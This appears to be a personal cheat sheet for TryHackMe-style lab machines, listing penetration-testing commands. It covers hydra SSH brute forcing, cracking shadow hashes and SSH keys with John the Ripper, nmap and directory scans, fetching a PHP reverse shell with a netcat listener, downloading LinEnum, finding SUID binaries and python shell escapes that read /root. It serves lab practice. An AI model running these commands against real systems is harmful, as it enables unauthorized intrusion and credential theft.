###  thm ubuntu box commands

# friendly reminders
1. Can you accomplish the same task in the shell and not use browser?

# useful github repos
https://github.com/danielmiessler/SecLists
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
https://gtfobins.github.io/  - GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems

# cheat sheets
https://tmuxcheatsheet.com/

# password brute forcing -- ssh
hydra -l kay -P /usr/share/wordlists/rockyou.txt ssh://10.10.220.188

# unshadow
unshadow local_passwd local_shadow > unshadowed
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed

# hash cracking: John the ripper
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python hash-id.py ${HASH}
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash4.txt

# john ssh private keys
/opt/john/ssh2john.py id_rsa > id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john

# password brute force 
hydra -l kay -P /usr/share/wordlists/rockyou.txt ssh://10.10.220.188

# port scanning 
nmap -vv -A ${HOST}

# reverse shell -- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
nc -v -n -l -p 1234
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
(remember to change ip and port in php code as needed)


# directory scanning options
dirb http://${HOST} /usr/share/dirb/wordlists/big.txt
gobuster dir -u http://${HOST} -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt

# getting linuxenum on target 
python3 -m http.server 8000
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x FILENAME.sh
find / -user root -perm /4000 -- remember to try next time

# exploiting python -- https://gtfobins.github.io/gtfobins/python/
python -c 'import os; os.system("/bin/sh -c \"ls /root\"")'
python -c 'import os; os.system("/bin/sh -c find / -name \"root.txt\" \| grep root.txt")'
python -c 'import os; os.system("/bin/sh -c locate -i root.txt")'
